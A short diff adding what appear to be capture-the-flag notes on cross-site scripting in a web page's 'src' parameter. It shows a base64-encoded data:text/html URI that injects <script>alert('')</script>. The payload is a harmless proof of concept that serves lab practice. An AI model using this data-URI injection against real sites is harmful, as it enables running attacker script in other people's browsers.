@@ -1,0 +1,4 @@
+/?page=media&src=nsa
+base64 a script --> <script>alert('')</script>
+change src
+/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnJyk8L3NjcmlwdD4=
